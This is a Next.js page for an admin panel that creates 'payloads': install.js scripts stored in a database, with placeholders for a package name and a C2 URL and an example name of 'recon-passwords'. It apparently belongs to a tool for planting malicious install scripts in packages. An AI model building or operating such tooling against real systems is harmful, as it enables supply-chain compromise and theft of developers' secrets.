import db, { type Payload } from '@/lib/db';
import Link from 'next/link';
import { addPayloadAction } from '../actions';

export const dynamic = 'force-dynamic';

export default async function NewPayloadPage({ searchParams }: { searchParams: Promise<{ error?: string }> }) {
  const { error } = await searchParams;
  const basic = db.prepare("SELECT install_js FROM payloads WHERE name = 'recon-basic'").get() as Pick<Payload, 'install_js'> | undefined;

  return (
    <div className="max-w-3xl space-y-6">
      <div className="flex items-center gap-4">
        <Link href="/payloads" className="text-gray-500 text-sm hover:text-white">← payloads</Link>
        <div className="text-xs text-gray-400">NEW PAYLOAD</div>
      </div>

      {error === 'missing' && (
        <div className="text-red-400 text-sm border border-red-900 px-3 py-2">name and install_js are required</div>
      )}

      <form action={addPayloadAction} className="space-y-4">
        <div className="space-y-1">
          <label className="text-xs text-gray-400">NAME</label>
          <input name="name" required placeholder="e.g. recon-passwords" className="w-full bg-black border border-gray-700 text-white text-sm p-2 focus:outline-none focus:border-white" />
        </div>
        <div className="space-y-1">
          <label className="text-xs text-gray-400">DESCRIPTION</label>
          <input name="description" placeholder="optional" className="w-full bg-black border border-gray-700 text-white text-sm p-2 focus:outline-none focus:border-white" />
        </div>
        <div className="space-y-1">
          <label className="text-xs text-gray-400">INSTALL.JS — use __PKG_NAME__ and __C2_URL__ as placeholders</label>
          <textarea
            name="install_js"
            rows={24}
            required
            defaultValue={basic?.install_js ?? ''}
            className="w-full bg-black border border-gray-700 text-white text-xs p-2 resize-y focus:outline-none focus:border-white font-mono"
          />
        </div>
        <button type="submit" className="border border-white px-4 py-1 text-sm hover:bg-white hover:text-black transition-colors">
          save payload
        </button>
      </form>
    </div>
  );
}
